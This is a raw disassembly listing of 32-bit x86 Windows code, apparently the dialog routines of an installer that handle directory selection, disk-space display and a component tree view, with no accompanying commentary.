  4049df:	85 c0                	test   %eax,%eax
  4049e1:	0f 84 8c 02 00 00    	je     0x404c73
  4049e7:	6a 01                	push   $0x1
  4049e9:	57                   	push   %edi
  4049ea:	ff d0                	call   *%eax
  4049ec:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  4049f3:	0f 85 d1 00 00 00    	jne    0x404aca
  4049f9:	0f b7 45 10          	movzwl 0x10(%ebp),%eax
  4049fd:	3d fb 03 00 00       	cmp    $0x3fb,%eax
  404a02:	75 18                	jne    0x404a1c
  404a04:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404a07:	c1 e9 10             	shr    $0x10,%ecx
  404a0a:	66 81 f9 00 03       	cmp    $0x300,%cx
  404a0f:	0f 85 5e 02 00 00    	jne    0x404c73
  404a15:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404a1c:	3d e9 03 00 00       	cmp    $0x3e9,%eax
  404a21:	0f 85 a3 00 00 00    	jne    0x404aca
  404a27:	6a 07                	push   $0x7
  404a29:	33 c0                	xor    %eax,%eax
  404a2b:	59                   	pop    %ecx
  404a2c:	8d 7d b8             	lea    -0x48(%ebp),%edi
  404a2f:	ff 75 f8             	push   -0x8(%ebp)
  404a32:	f3 ab                	rep stos %eax,%es:(%edi)
  404a34:	bf 58 09 42 00       	mov    $0x420958,%edi
  404a39:	68 30 fd 41 00       	push   $0x41fd30
  404a3e:	89 75 b4             	mov    %esi,-0x4c(%ebp)
  404a41:	89 7d bc             	mov    %edi,-0x44(%ebp)
  404a44:	c7 45 c8 88 4c 40 00 	movl   $0x404c88,-0x38(%ebp)
  404a4b:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  404a4e:	e8 45 1a 00 00       	call   0x406498
  404a53:	89 45 c0             	mov    %eax,-0x40(%ebp)
  404a56:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  404a59:	50                   	push   %eax
  404a5a:	c7 45 c4 41 00 00 00 	movl   $0x41,-0x3c(%ebp)
  404a61:	ff 15 6c 81 40 00    	call   *0x40816c
  404a67:	85 c0                	test   %eax,%eax
  404a69:	74 58                	je     0x404ac3
  404a6b:	50                   	push   %eax
  404a6c:	ff 15 8c 82 40 00    	call   *0x40828c
  404a72:	53                   	push   %ebx
  404a73:	e8 1f 13 00 00       	call   0x405d97
  404a78:	a1 70 43 42 00       	mov    0x424370,%eax
  404a7d:	8b 80 1c 01 00 00    	mov    0x11c(%eax),%eax
  404a83:	85 c0                	test   %eax,%eax
  404a85:	74 28                	je     0x404aaf
  404a87:	81 fb 00 a4 42 00    	cmp    $0x42a400,%ebx
  404a8d:	75 20                	jne    0x404aaf
  404a8f:	50                   	push   %eax
  404a90:	6a 00                	push   $0x0
  404a92:	e8 01 1a 00 00       	call   0x406498
  404a97:	57                   	push   %edi
  404a98:	bf 00 33 42 00       	mov    $0x423300,%edi
  404a9d:	57                   	push   %edi
  404a9e:	ff 15 fc 80 40 00    	call   *0x4080fc
  404aa4:	85 c0                	test   %eax,%eax
  404aa6:	74 07                	je     0x404aaf
  404aa8:	57                   	push   %edi
  404aa9:	53                   	push   %ebx
  404aaa:	e8 72 19 00 00       	call   0x406421
  404aaf:	ff 05 48 09 42 00    	incl   0x420948
  404ab5:	53                   	push   %ebx
  404ab6:	68 fb 03 00 00       	push   $0x3fb
  404abb:	56                   	push   %esi
  404abc:	e8 38 10 00 00       	call   0x405af9
  404ac1:	eb 07                	jmp    0x404aca
  404ac3:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404aca:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  404ad1:	74 0d                	je     0x404ae0
  404ad3:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  404ada:	0f 85 93 01 00 00    	jne    0x404c73
  404ae0:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  404ae4:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  404ae8:	53                   	push   %ebx
  404ae9:	68 fb 03 00 00       	push   $0x3fb
  404aee:	e8 0c 10 00 00       	call   0x405aff
  404af3:	53                   	push   %ebx
  404af4:	e8 8c 13 00 00       	call   0x405e85
  404af9:	85 c0                	test   %eax,%eax
  404afb:	75 07                	jne    0x404b04
  404afd:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  404b04:	be 28 f9 41 00       	mov    $0x41f928,%esi
  404b09:	53                   	push   %ebx
  404b0a:	56                   	push   %esi
  404b0b:	e8 f5 18 00 00       	call   0x406405
  404b10:	6a 01                	push   $0x1
  404b12:	e8 16 1d 00 00       	call   0x40682d
  404b17:	85 c0                	test   %eax,%eax
  404b19:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404b1c:	74 35                	je     0x404b53
  404b1e:	33 c0                	xor    %eax,%eax
  404b20:	33 ff                	xor    %edi,%edi
  404b22:	3b c6                	cmp    %esi,%eax
  404b24:	74 2d                	je     0x404b53
  404b26:	8d 45 dc             	lea    -0x24(%ebp),%eax
  404b29:	50                   	push   %eax
  404b2a:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404b2d:	50                   	push   %eax
  404b2e:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  404b31:	50                   	push   %eax
  404b32:	56                   	push   %esi
  404b33:	ff 55 f4             	call   *-0xc(%ebp)
  404b36:	85 c0                	test   %eax,%eax
  404b38:	75 71                	jne    0x404bab
  404b3a:	85 ff                	test   %edi,%edi
  404b3c:	74 02                	je     0x404b40
  404b3e:	20 07                	and    %al,(%edi)
  404b40:	56                   	push   %esi
  404b41:	e8 98 12 00 00       	call   0x405dde
  404b46:	8b f8                	mov    %eax,%edi
  404b48:	80 27 00             	andb   $0x0,(%edi)
  404b4b:	4f                   	dec    %edi
  404b4c:	3b fe                	cmp    %esi,%edi
  404b4e:	c6 07 5c             	movb   $0x5c,(%edi)
  404b51:	75 d3                	jne    0x404b26
  404b53:	53                   	push   %ebx
  404b54:	56                   	push   %esi
  404b55:	e8 ab 18 00 00       	call   0x406405
  404b5a:	56                   	push   %esi
  404b5b:	e8 d0 12 00 00       	call   0x405e30
  404b60:	33 ff                	xor    %edi,%edi
  404b62:	3b c7                	cmp    %edi,%eax
  404b64:	74 03                	je     0x404b69
  404b66:	80 20 00             	andb   $0x0,(%eax)
  404b69:	8d 45 e0             	lea    -0x20(%ebp),%eax
  404b6c:	50                   	push   %eax
  404b6d:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404b70:	50                   	push   %eax
  404b71:	8d 45 ec             	lea    -0x14(%ebp),%eax
  404b74:	50                   	push   %eax
  404b75:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404b78:	50                   	push   %eax
  404b79:	56                   	push   %esi
  404b7a:	ff 15 88 80 40 00    	call   *0x408088
  404b80:	85 c0                	test   %eax,%eax
  404b82:	74 43                	je     0x404bc7
  404b84:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404b87:	be 00 04 00 00       	mov    $0x400,%esi
  404b8c:	0f af 45 ec          	imul   -0x14(%ebp),%eax
  404b90:	56                   	push   %esi
  404b91:	ff 75 f4             	push   -0xc(%ebp)
  404b94:	50                   	push   %eax
  404b95:	ff 15 3c 81 40 00    	call   *0x40813c
  404b9b:	99                   	cltd
  404b9c:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404b9f:	89 55 d8             	mov    %edx,-0x28(%ebp)
  404ba2:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  404ba9:	eb 21                	jmp    0x404bcc
  404bab:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  404bae:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  404bb1:	0f ac c8 0a          	shrd   $0xa,%ecx,%eax
  404bb5:	c1 e9 0a             	shr    $0xa,%ecx
  404bb8:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404bbb:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  404bbe:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  404bc5:	33 ff                	xor    %edi,%edi
  404bc7:	be 00 04 00 00       	mov    $0x400,%esi
  404bcc:	6a 05                	push   $0x5
  404bce:	e8 f8 01 00 00       	call   0x404dcb
  404bd3:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  404bd6:	74 19                	je     0x404bf1
  404bd8:	8b 55 d8             	mov    -0x28(%ebp),%edx
  404bdb:	33 c9                	xor    %ecx,%ecx
  404bdd:	3b d1                	cmp    %ecx,%edx
  404bdf:	77 10                	ja     0x404bf1
  404be1:	72 07                	jb     0x404bea
  404be3:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  404be6:	3b c8                	cmp    %eax,%ecx
  404be8:	73 07                	jae    0x404bf1
  404bea:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  404bf1:	8b 0d 3c 3b 42 00    	mov    0x423b3c,%ecx
  404bf7:	39 79 10             	cmp    %edi,0x10(%ecx)
  404bfa:	74 30                	je     0x404c2c
  404bfc:	50                   	push   %eax
  404bfd:	6a fb                	push   $0xfffffffb
  404bff:	68 ff 03 00 00       	push   $0x3ff
  404c04:	e8 aa 01 00 00       	call   0x404db3
  404c09:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  404c0c:	74 10                	je     0x404c1e
  404c0e:	ff 75 d8             	push   -0x28(%ebp)
  404c11:	ff 75 d4             	push   -0x2c(%ebp)
  404c14:	6a fc                	push   $0xfffffffc
  404c16:	56                   	push   %esi
  404c17:	e8 d2 00 00 00       	call   0x404cee
  404c1c:	eb 0e                	jmp    0x404c2c
  404c1e:	68 14 f9 41 00       	push   $0x41f914
  404c23:	56                   	push   %esi
  404c24:	ff 75 08             	push   0x8(%ebp)
  404c27:	e8 cd 0e 00 00       	call   0x405af9
  404c2c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404c2f:	3b c7                	cmp    %edi,%eax
  404c31:	a3 04 44 42 00       	mov    %eax,0x424404
  404c36:	75 0a                	jne    0x404c42
  404c38:	6a 07                	push   $0x7
  404c3a:	e8 cc c7 ff ff       	call   0x40140b
  404c3f:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404c42:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404c45:	85 70 14             	test   %esi,0x14(%eax)
  404c48:	74 03                	je     0x404c4d
  404c4a:	89 7d fc             	mov    %edi,-0x4(%ebp)
  404c4d:	33 c0                	xor    %eax,%eax
  404c4f:	39 7d fc             	cmp    %edi,-0x4(%ebp)
  404c52:	0f 94 c0             	sete   %al
  404c55:	50                   	push   %eax
  404c56:	e8 6c f8 ff ff       	call   0x4044c7
  404c5b:	39 7d fc             	cmp    %edi,-0x4(%ebp)
  404c5e:	75 0d                	jne    0x404c6d
  404c60:	39 3d 48 09 42 00    	cmp    %edi,0x420948
  404c66:	75 05                	jne    0x404c6d
  404c68:	e8 23 fc ff ff       	call   0x404890
  404c6d:	89 3d 48 09 42 00    	mov    %edi,0x420948
  404c73:	ff 75 14             	push   0x14(%ebp)
  404c76:	ff 75 10             	push   0x10(%ebp)
  404c79:	ff 75 0c             	push   0xc(%ebp)
  404c7c:	e8 8b f8 ff ff       	call   0x40450c
  404c81:	5f                   	pop    %edi
  404c82:	5e                   	pop    %esi
  404c83:	5b                   	pop    %ebx
  404c84:	c9                   	leave
  404c85:	c2 10 00             	ret    $0x10
  404c88:	55                   	push   %ebp
  404c89:	8b ec                	mov    %esp,%ebp
  404c8b:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  404c8f:	56                   	push   %esi
  404c90:	8b 35 44 82 40 00    	mov    0x408244,%esi
  404c96:	75 1c                	jne    0x404cb4
  404c98:	ff 75 14             	push   0x14(%ebp)
  404c9b:	68 fb 03 00 00       	push   $0x3fb
  404ca0:	e8 5a 0e 00 00       	call   0x405aff
  404ca5:	ff 75 14             	push   0x14(%ebp)
  404ca8:	6a 01                	push   $0x1
  404caa:	68 66 04 00 00       	push   $0x466
  404caf:	ff 75 08             	push   0x8(%ebp)
  404cb2:	ff d6                	call   *%esi
  404cb4:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  404cb8:	75 2d                	jne    0x404ce7
  404cba:	ff 75 14             	push   0x14(%ebp)
  404cbd:	ff 75 10             	push   0x10(%ebp)
  404cc0:	ff 15 68 81 40 00    	call   *0x408168
  404cc6:	85 c0                	test   %eax,%eax
  404cc8:	74 0e                	je     0x404cd8
  404cca:	6a 07                	push   $0x7
  404ccc:	e8 3a c7 ff ff       	call   0x40140b
  404cd1:	85 c0                	test   %eax,%eax
  404cd3:	75 03                	jne    0x404cd8
  404cd5:	40                   	inc    %eax
  404cd6:	eb 02                	jmp    0x404cda
  404cd8:	33 c0                	xor    %eax,%eax
  404cda:	50                   	push   %eax
  404cdb:	6a 00                	push   $0x0
  404cdd:	68 65 04 00 00       	push   $0x465
  404ce2:	ff 75 08             	push   0x8(%ebp)
  404ce5:	ff d6                	call   *%esi
  404ce7:	33 c0                	xor    %eax,%eax
  404ce9:	5e                   	pop    %esi
  404cea:	5d                   	pop    %ebp
  404ceb:	c2 10 00             	ret    $0x10
  404cee:	55                   	push   %ebp
  404cef:	8b ec                	mov    %esp,%ebp
  404cf1:	83 ec 40             	sub    $0x40,%esp
  404cf4:	8b 45 14             	mov    0x14(%ebp),%eax
  404cf7:	53                   	push   %ebx
  404cf8:	56                   	push   %esi
  404cf9:	8b 75 10             	mov    0x10(%ebp),%esi
  404cfc:	57                   	push   %edi
  404cfd:	6a dc                	push   $0xffffffdc
  404cff:	85 c0                	test   %eax,%eax
  404d01:	5b                   	pop    %ebx
  404d02:	74 0b                	je     0x404d0f
  404d04:	0f ac c6 14          	shrd   $0x14,%eax,%esi
  404d08:	c1 e8 14             	shr    $0x14,%eax
  404d0b:	33 ff                	xor    %edi,%edi
  404d0d:	eb 4e                	jmp    0x404d5d
  404d0f:	6a 14                	push   $0x14
  404d11:	81 fe 00 00 10 00    	cmp    $0x100000,%esi
  404d17:	59                   	pop    %ecx
  404d18:	8b c6                	mov    %esi,%eax
  404d1a:	73 06                	jae    0x404d22
  404d1c:	6a 0a                	push   $0xa
  404d1e:	59                   	pop    %ecx
  404d1f:	6a dd                	push   $0xffffffdd
  404d21:	5b                   	pop    %ebx
  404d22:	81 fe 00 04 00 00    	cmp    $0x400,%esi
  404d28:	73 05                	jae    0x404d2f
  404d2a:	6a de                	push   $0xffffffde
  404d2c:	33 c9                	xor    %ecx,%ecx
  404d2e:	5b                   	pop    %ebx
  404d2f:	81 fe 33 33 ff ff    	cmp    $0xffff3333,%esi
  404d35:	73 0d                	jae    0x404d44
  404d37:	33 c0                	xor    %eax,%eax
  404d39:	6a 14                	push   $0x14
  404d3b:	40                   	inc    %eax
  404d3c:	5f                   	pop    %edi
  404d3d:	d3 e0                	shl    %cl,%eax
  404d3f:	99                   	cltd
  404d40:	f7 ff                	idiv   %edi
  404d42:	03 c6                	add    %esi,%eax
  404d44:	8b f0                	mov    %eax,%esi
  404d46:	25 ff ff ff 00       	and    $0xffffff,%eax
  404d4b:	6a 0a                	push   $0xa
  404d4d:	33 d2                	xor    %edx,%edx
  404d4f:	8d 04 80             	lea    (%eax,%eax,4),%eax
  404d52:	03 c0                	add    %eax,%eax
  404d54:	d3 e8                	shr    %cl,%eax
  404d56:	d3 ee                	shr    %cl,%esi
  404d58:	59                   	pop    %ecx
  404d59:	f7 f1                	div    %ecx
  404d5b:	8b fa                	mov    %edx,%edi
  404d5d:	8d 45 e0             	lea    -0x20(%ebp),%eax
  404d60:	6a df                	push   $0xffffffdf
  404d62:	50                   	push   %eax
  404d63:	e8 30 17 00 00       	call   0x406498
  404d68:	50                   	push   %eax
  404d69:	8d 45 c0             	lea    -0x40(%ebp),%eax
  404d6c:	53                   	push   %ebx
  404d6d:	50                   	push   %eax
  404d6e:	e8 25 17 00 00       	call   0x406498
  404d73:	50                   	push   %eax
  404d74:	57                   	push   %edi
  404d75:	56                   	push   %esi
  404d76:	68 18 a2 40 00       	push   $0x40a218
  404d7b:	ff 75 0c             	push   0xc(%ebp)
  404d7e:	be 58 09 42 00       	mov    $0x420958,%esi
  404d83:	56                   	push   %esi
  404d84:	e8 0f 17 00 00       	call   0x406498
  404d89:	56                   	push   %esi
  404d8a:	8b f8                	mov    %eax,%edi
  404d8c:	e8 8a 16 00 00       	call   0x40641b
  404d91:	03 f8                	add    %eax,%edi
  404d93:	57                   	push   %edi
  404d94:	ff 15 18 82 40 00    	call   *0x408218
  404d9a:	83 c4 18             	add    $0x18,%esp
  404d9d:	56                   	push   %esi
  404d9e:	ff 75 08             	push   0x8(%ebp)
  404da1:	ff 35 38 3b 42 00    	push   0x423b38
  404da7:	e8 4d 0d 00 00       	call   0x405af9
  404dac:	5f                   	pop    %edi
  404dad:	5e                   	pop    %esi
  404dae:	5b                   	pop    %ebx
  404daf:	c9                   	leave
  404db0:	c2 10 00             	ret    $0x10
  404db3:	8b 44 24 0c          	mov    0xc(%esp),%eax
  404db7:	33 c9                	xor    %ecx,%ecx
  404db9:	51                   	push   %ecx
  404dba:	50                   	push   %eax
  404dbb:	ff 74 24 10          	push   0x10(%esp)
  404dbf:	ff 74 24 10          	push   0x10(%esp)
  404dc3:	e8 26 ff ff ff       	call   0x404cee
  404dc8:	c2 0c 00             	ret    $0xc
  404dcb:	8b 15 8c 43 42 00    	mov    0x42438c,%edx
  404dd1:	8b 0d 88 43 42 00    	mov    0x424388,%ecx
  404dd7:	33 c0                	xor    %eax,%eax
  404dd9:	85 d2                	test   %edx,%edx
  404ddb:	74 18                	je     0x404df5
  404ddd:	56                   	push   %esi
  404dde:	f6 41 08 01          	testb  $0x1,0x8(%ecx)
  404de2:	74 07                	je     0x404deb
  404de4:	8b 74 24 08          	mov    0x8(%esp),%esi
  404de8:	03 04 b1             	add    (%ecx,%esi,4),%eax
  404deb:	81 c1 18 04 00 00    	add    $0x418,%ecx
  404df1:	4a                   	dec    %edx
  404df2:	75 ea                	jne    0x404dde
  404df4:	5e                   	pop    %esi
  404df5:	c2 04 00             	ret    $0x4
  404df8:	55                   	push   %ebp
  404df9:	8b ec                	mov    %esp,%ebp
  404dfb:	83 ec 38             	sub    $0x38,%esp
  404dfe:	56                   	push   %esi
  404dff:	8b 35 44 82 40 00    	mov    0x408244,%esi
  404e05:	57                   	push   %edi
  404e06:	8b 7d 08             	mov    0x8(%ebp),%edi
  404e09:	6a 00                	push   $0x0
  404e0b:	6a 09                	push   $0x9
  404e0d:	68 0a 11 00 00       	push   $0x110a
  404e12:	57                   	push   %edi
  404e13:	ff d6                	call   *%esi
  404e15:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  404e19:	74 3c                	je     0x404e57
  404e1b:	ff 15 a8 81 40 00    	call   *0x4081a8
  404e21:	0f bf c8             	movswl %ax,%ecx
  404e24:	c1 e8 10             	shr    $0x10,%eax
  404e27:	0f bf c0             	movswl %ax,%eax
  404e2a:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404e2d:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404e30:	50                   	push   %eax
  404e31:	57                   	push   %edi
  404e32:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  404e35:	ff 15 d8 81 40 00    	call   *0x4081d8
  404e3b:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404e3e:	50                   	push   %eax
  404e3f:	6a 00                	push   $0x0
  404e41:	68 11 11 00 00       	push   $0x1111
  404e46:	57                   	push   %edi
  404e47:	ff d6                	call   *%esi
  404e49:	f6 45 f8 66          	testb  $0x66,-0x8(%ebp)
  404e4d:	75 05                	jne    0x404e54
  404e4f:	83 c8 ff             	or     $0xffffffff,%eax
  404e52:	eb 1e                	jmp    0x404e72
  404e54:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404e57:	89 45 cc             	mov    %eax,-0x34(%ebp)
  404e5a:	8d 45 c8             	lea    -0x38(%ebp),%eax
  404e5d:	50                   	push   %eax
  404e5e:	6a 00                	push   $0x0
  404e60:	68 0c 11 00 00       	push   $0x110c
  404e65:	57                   	push   %edi
  404e66:	c7 45 c8 04 00 00 00 	movl   $0x4,-0x38(%ebp)
  404e6d:	ff d6                	call   *%esi
  404e6f:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404e72:	5f                   	pop    %edi
  404e73:	5e                   	pop    %esi
  404e74:	c9                   	leave
  404e75:	c2 08 00             	ret    $0x8
  404e78:	56                   	push   %esi
  404e79:	57                   	push   %edi
  404e7a:	be 00 50 42 00       	mov    $0x425000,%esi
  404e7f:	bf 58 09 42 00       	mov    $0x420958,%edi
  404e84:	56                   	push   %esi
  404e85:	57                   	push   %edi
  404e86:	e8 7a 15 00 00       	call   0x406405
  404e8b:	ff 74 24 10          	push   0x10(%esp)
  404e8f:	56                   	push   %esi
  404e90:	e8 ce 14 00 00       	call   0x406363
  404e95:	ff 74 24 0c          	push   0xc(%esp)
  404e99:	e8 6d c5 ff ff       	call   0x40140b
  404e9e:	57                   	push   %edi
  404e9f:	56                   	push   %esi
  404ea0:	e8 60 15 00 00       	call   0x406405
  404ea5:	5f                   	pop    %edi
  404ea6:	5e                   	pop    %esi
  404ea7:	c2 08 00             	ret    $0x8
  404eaa:	55                   	push   %ebp
  404eab:	8b ec                	mov    %esp,%ebp
  404ead:	83 ec 54             	sub    $0x54,%esp
  404eb0:	53                   	push   %ebx
  404eb1:	56                   	push   %esi
  404eb2:	8b 35 28 82 40 00    	mov    0x408228,%esi
  404eb8:	57                   	push   %edi
  404eb9:	68 f9 03 00 00       	push   $0x3f9
  404ebe:	ff 75 08             	push   0x8(%ebp)
  404ec1:	ff d6                	call   *%esi
  404ec3:	68 08 04 00 00       	push   $0x408
  404ec8:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404ecb:	ff 75 08             	push   0x8(%ebp)
  404ece:	ff d6                	call   *%esi
  404ed0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404ed3:	a1 88 43 42 00       	mov    0x424388,%eax
  404ed8:	8b 35 44 82 40 00    	mov    0x408244,%esi
  404ede:	89 45 ec             	mov    %eax,-0x14(%ebp)
  404ee1:	a1 70 43 42 00       	mov    0x424370,%eax
  404ee6:	33 db                	xor    %ebx,%ebx
  404ee8:	05 94 00 00 00       	add    $0x94,%eax
  404eed:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404ef4:	6a 10                	push   $0x10
  404ef6:	89 45 e8             	mov    %eax,-0x18(%ebp)
  404ef9:	5f                   	pop    %edi
  404efa:	0f 85 27 02 00 00    	jne    0x405127
  404f00:	8b 45 08             	mov    0x8(%ebp),%eax
  404f03:	89 5d e0             	mov    %ebx,-0x20(%ebp)
  404f06:	a3 c0 43 42 00       	mov    %eax,0x4243c0
  404f0b:	a1 8c 43 42 00       	mov    0x42438c,%eax
  404f10:	c1 e0 02             	shl    $0x2,%eax
  404f13:	50                   	push   %eax
  404f14:	6a 40                	push   $0x40
  404f16:	c7 45 f0 02 00 00 00 	movl   $0x2,-0x10(%ebp)
  404f1d:	ff 15 0c 81 40 00    	call   *0x40810c
  404f23:	53                   	push   %ebx
  404f24:	53                   	push   %ebx
  404f25:	53                   	push   %ebx
  404f26:	53                   	push   %ebx
  404f27:	6a 6e                	push   $0x6e
  404f29:	a3 50 09 42 00       	mov    %eax,0x420950
  404f2e:	ff 35 60 43 42 00    	push   0x424360
  404f34:	ff 15 30 82 40 00    	call   *0x408230
  404f3a:	83 0d 44 09 42 00 ff 	orl    $0xffffffff,0x420944
  404f41:	68 bd 54 40 00       	push   $0x4054bd
  404f46:	6a fc                	push   $0xfffffffc
  404f48:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404f4b:	ff 75 fc             	push   -0x4(%ebp)
  404f4e:	ff 15 2c 82 40 00    	call   *0x40822c
  404f54:	53                   	push   %ebx
  404f55:	6a 06                	push   $0x6
  404f57:	6a 21                	push   $0x21
  404f59:	57                   	push   %edi
  404f5a:	57                   	push   %edi
  404f5b:	a3 4c 09 42 00       	mov    %eax,0x42094c
  404f60:	ff 15 40 80 40 00    	call   *0x408040
  404f66:	68 ff 00 ff 00       	push   $0xff00ff
  404f6b:	a3 3c 09 42 00       	mov    %eax,0x42093c
  404f70:	ff 75 f4             	push   -0xc(%ebp)
  404f73:	50                   	push   %eax
  404f74:	ff 15 3c 80 40 00    	call   *0x40803c
  404f7a:	ff 35 3c 09 42 00    	push   0x42093c
  404f80:	6a 02                	push   $0x2
  404f82:	68 09 11 00 00       	push   $0x1109
  404f87:	ff 75 fc             	push   -0x4(%ebp)
  404f8a:	ff d6                	call   *%esi
  404f8c:	53                   	push   %ebx
  404f8d:	53                   	push   %ebx
  404f8e:	68 1c 11 00 00       	push   $0x111c
  404f93:	ff 75 fc             	push   -0x4(%ebp)
  404f96:	ff d6                	call   *%esi
  404f98:	3b c7                	cmp    %edi,%eax
  404f9a:	7d 0c                	jge    0x404fa8
  404f9c:	53                   	push   %ebx
  404f9d:	57                   	push   %edi
  404f9e:	68 1b 11 00 00       	push   $0x111b
  404fa3:	ff 75 fc             	push   -0x4(%ebp)
  404fa6:	ff d6                	call   *%esi
  404fa8:	ff 75 f4             	push   -0xc(%ebp)
  404fab:	ff 15 54 80 40 00    	call   *0x408054
  404fb1:	33 ff                	xor    %edi,%edi
  404fb3:	8b 45 e8             	mov    -0x18(%ebp),%eax
  404fb6:	8b 04 b8             	mov    (%eax,%edi,4),%eax
  404fb9:	3b c3                	cmp    %ebx,%eax
  404fbb:	74 27                	je     0x404fe4
  404fbd:	83 ff 20             	cmp    $0x20,%edi
  404fc0:	74 03                	je     0x404fc5
  404fc2:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  404fc5:	50                   	push   %eax
  404fc6:	53                   	push   %ebx
  404fc7:	e8 cc 14 00 00       	call   0x406498
  404fcc:	50                   	push   %eax
  404fcd:	53                   	push   %ebx
  404fce:	68 43 01 00 00       	push   $0x143
  404fd3:	ff 75 f8             	push   -0x8(%ebp)
  404fd6:	ff d6                	call   *%esi
  404fd8:	57                   	push   %edi
  404fd9:	50                   	push   %eax
  404fda:	68 51 01 00 00       	push   $0x151
  404fdf:	ff 75 f8             	push   -0x8(%ebp)
  404fe2:	ff d6                	call   *%esi
  404fe4:	47                   	inc    %edi
  404fe5:	83 ff 21             	cmp    $0x21,%edi
  404fe8:	7c c9                	jl     0x404fb3
  404fea:	8b 7d 14             	mov    0x14(%ebp),%edi
  404fed:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404ff0:	ff 74 87 30          	push   0x30(%edi,%eax,4)
  404ff4:	6a 15                	push   $0x15
  404ff6:	ff 75 08             	push   0x8(%ebp)
  404ff9:	e8 a7 f4 ff ff       	call   0x4044a5
  404ffe:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405001:	ff 74 87 34          	push   0x34(%edi,%eax,4)
  405005:	6a 16                	push   $0x16
  405007:	ff 75 08             	push   0x8(%ebp)
  40500a:	e8 96 f4 ff ff       	call   0x4044a5
  40500f:	33 ff                	xor    %edi,%edi
  405011:	39 1d 8c 43 42 00    	cmp    %ebx,0x42438c
  405017:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  40501a:	0f 8e c9 00 00 00    	jle    0x4050e9
  405020:	8b 45 ec             	mov    -0x14(%ebp),%eax
  405023:	8d 50 08             	lea    0x8(%eax),%edx
  405026:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  405029:	8d 42 10             	lea    0x10(%edx),%eax
  40502c:	38 18                	cmp    %bl,(%eax)
  40502e:	0f 84 97 00 00 00    	je     0x4050cb
  405034:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  405037:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  40503a:	8b 02                	mov    (%edx),%eax
  40503c:	6a 20                	push   $0x20
  40503e:	89 4d ac             	mov    %ecx,-0x54(%ebp)
  405041:	59                   	pop    %ecx
  405042:	8b d0                	mov    %eax,%edx
  405044:	c7 45 b0 02 00 ff ff 	movl   $0xffff0002,-0x50(%ebp)
  40504b:	23 d1                	and    %ecx,%edx
  40504d:	c7 45 b4 0d 00 00 00 	movl   $0xd,-0x4c(%ebp)
  405054:	a8 02                	test   $0x2,%al
  405056:	89 4d c0             	mov    %ecx,-0x40(%ebp)
  405059:	89 7d d8             	mov    %edi,-0x28(%ebp)
  40505c:	89 55 bc             	mov    %edx,-0x44(%ebp)
  40505f:	74 3a                	je     0x40509b
  405061:	8d 45 ac             	lea    -0x54(%ebp),%eax
  405064:	c7 45 b4 4d 00 00 00 	movl   $0x4d,-0x4c(%ebp)
  40506b:	50                   	push   %eax
  40506c:	53                   	push   %ebx
  40506d:	68 00 11 00 00       	push   $0x1100
  405072:	c7 45 d4 01 00 00 00 	movl   $0x1,-0x2c(%ebp)
  405079:	ff 75 fc             	push   -0x4(%ebp)
  40507c:	ff d6                	call   *%esi
  40507e:	8b 0d 50 09 42 00    	mov    0x420950,%ecx
  405084:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
  40508b:	89 04 b9             	mov    %eax,(%ecx,%edi,4)
  40508e:	a1 50 09 42 00       	mov    0x420950,%eax
  405093:	8b 04 b8             	mov    (%eax,%edi,4),%eax
  405096:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405099:	eb 30                	jmp    0x4050cb
  40509b:	a8 04                	test   $0x4,%al
  40509d:	74 14                	je     0x4050b3
  40509f:	ff 75 f4             	push   -0xc(%ebp)
  4050a2:	6a 03                	push   $0x3
  4050a4:	68 0a 11 00 00       	push   $0x110a
  4050a9:	ff 75 fc             	push   -0x4(%ebp)
  4050ac:	ff d6                	call   *%esi
  4050ae:	89 45 f4             	mov    %eax,-0xc(%ebp)
